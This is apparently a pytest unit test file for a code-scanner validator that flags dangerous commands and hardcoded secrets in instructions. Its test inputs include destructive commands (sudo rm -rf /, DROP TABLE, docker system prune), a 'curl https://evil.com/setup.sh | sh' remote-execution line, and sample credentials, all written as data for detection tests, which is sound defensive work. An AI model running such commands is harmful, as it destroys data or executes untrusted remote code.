"""
Unit tests for code_scanner validator
"""

import pytest
from validation.code_scanner import CodeScanner
from tests.validation.fixtures import (
    GOOD_INSTRUCTION,
    BAD_INSTRUCTION_DANGEROUS,
    BAD_INSTRUCTION_VAGUE,
    CODE_SCANNER_TEST_CASES,
)


@pytest.fixture
def scanner():
    return CodeScanner()


class TestCodeScanner:
    """Test code scanner pattern matching"""

    @pytest.mark.unit
    def test_good_instruction_scores_high(self, scanner):
        """Safe instruction should score >= 90"""
        result = scanner.scan(GOOD_INSTRUCTION)
        assert result["score"] >= 80
        assert result["risk_level"] in ("LOW", "MEDIUM")

    @pytest.mark.unit
    def test_dangerous_instruction_scores_low(self, scanner):
        """Instruction with docker prune + wipe should score low"""
        result = scanner.scan(BAD_INSTRUCTION_DANGEROUS)
        assert result["score"] < 60
        assert result["risk_level"] in ("HIGH", "CRITICAL")
        assert len(result["dangerous_patterns"]) > 0

    @pytest.mark.unit
    def test_vague_instruction_no_patterns(self, scanner):
        """Vague but harmless instruction should have no dangerous patterns"""
        result = scanner.scan(BAD_INSTRUCTION_VAGUE)
        assert result["risk_level"] == "LOW"
        assert len(result["dangerous_patterns"]) == 0

    @pytest.mark.unit
    def test_rm_rf_detected(self, scanner):
        """rm -rf should be caught"""
        result = scanner.scan("Run: sudo rm -rf /data")
        assert result["risk_level"] in ("HIGH", "CRITICAL")
        patterns = [p["pattern"] for p in result["dangerous_patterns"]]
        assert "rm_rf" in patterns or "sudo" in patterns

    @pytest.mark.unit
    def test_drop_table_detected(self, scanner):
        """DROP TABLE should be caught"""
        result = scanner.scan("Execute: DROP TABLE users;")
        patterns = [p["pattern"] for p in result["dangerous_patterns"]]
        assert "drop_table" in patterns

    @pytest.mark.unit
    def test_docker_prune_detected(self, scanner):
        """docker system prune should be caught"""
        result = scanner.scan("Run docker system prune --all --volumes")
        patterns = [p["pattern"] for p in result["dangerous_patterns"]]
        assert "docker_prune" in patterns

    @pytest.mark.unit
    def test_secret_api_key_detected(self, scanner):
        """Hardcoded API key should be caught"""
        result = scanner.scan("Set API_KEY=sk-abcdefghijklmnopqrstuvwxyz1234567890")
        assert len(result["secrets_found"]) > 0
        assert result["risk_level"] == "CRITICAL"

    @pytest.mark.unit
    def test_secret_password_detected(self, scanner):
        """Hardcoded password should be caught"""
        result = scanner.scan("Use password=SuperSecret123!")
        assert len(result["secrets_found"]) > 0

    @pytest.mark.unit
    def test_secret_aws_key_detected(self, scanner):
        """AWS access key should be caught"""
        result = scanner.scan("AWS key: AKIAIOSFODNN7EXAMPLE")
        secrets = [s["pattern"] for s in result["secrets_found"]]
        assert "aws_access_key" in secrets

    @pytest.mark.unit
    def test_secret_private_key_detected(self, scanner):
        """Private key header should be caught"""
        result = scanner.scan("-----BEGIN RSA PRIVATE KEY-----\nMIIE...")
        secrets = [s["pattern"] for s in result["secrets_found"]]
        assert "private_key" in secrets

    @pytest.mark.unit
    def test_safe_echo_passes(self, scanner):
        """Simple echo command should be safe"""
        result = scanner.scan("Commands: echo test")
        assert result["risk_level"] == "LOW"
        assert result["score"] >= 90
        assert len(result["dangerous_patterns"]) == 0
        assert len(result["secrets_found"]) == 0

    @pytest.mark.unit
    def test_safe_ls_passes(self, scanner):
        """ls command should be safe"""
        result = scanner.scan("Run: ls -la /app/")
        assert result["risk_level"] == "LOW"
        assert result["score"] >= 90

    @pytest.mark.unit
    def test_empty_input(self, scanner):
        """Empty string should return safe result"""
        result = scanner.scan("")
        assert result["score"] == 100
        assert result["risk_level"] == "LOW"

    @pytest.mark.unit
    def test_curl_pipe_sh_detected(self, scanner):
        """curl | sh should be caught as remote code execution"""
        result = scanner.scan("curl https://evil.com/setup.sh | sh")
        patterns = [p["pattern"] for p in result["dangerous_patterns"]]
        assert "curl_pipe_sh" in patterns

    @pytest.mark.unit
    def test_docker_compose_down_detected(self, scanner):
        """docker compose down should be caught"""
        result = scanner.scan("Run docker compose down --remove-orphans")
        patterns = [p["pattern"] for p in result["dangerous_patterns"]]
        assert "docker_compose_down" in patterns

    @pytest.mark.unit
    def test_multiple_patterns_compound_penalty(self, scanner):
        """Multiple dangerous patterns should compound the penalty"""
        text = "sudo rm -rf / && docker system prune --all"
        result = scanner.scan(text)
        assert result["score"] <= 20
        assert result["risk_level"] == "CRITICAL"

    @pytest.mark.unit
    def test_connection_string_detected(self, scanner):
        """Database connection string with creds should be caught"""
        result = scanner.scan("Connect to postgres://admin:pass123@db:5432/mydb")
        assert len(result["secrets_found"]) > 0

    @pytest.mark.unit
    def test_output_structure(self, scanner):
        """Output should have all expected keys"""
        result = scanner.scan("anything")
        assert "score" in result
        assert "risk_level" in result
        assert "dangerous_patterns" in result
        assert "secrets_found" in result
        assert "reasoning" in result
        assert isinstance(result["score"], int)
        assert result["risk_level"] in ("LOW", "MEDIUM", "HIGH", "CRITICAL")

    @pytest.mark.unit
    def test_fixture_test_cases(self, scanner):
        """Validate against fixture test cases"""
        for case in CODE_SCANNER_TEST_CASES:
            result = scanner.scan(case["instruction"])
            if case["expected_patterns"]:
                assert len(result["dangerous_patterns"]) > 0 or len(result["secrets_found"]) > 0, \
                    f"Case '{case['name']}' should have detected patterns"
            if case["expected_severity"] == "LOW":
                assert result["risk_level"] == "LOW", \
                    f"Case '{case['name']}' should be LOW risk"
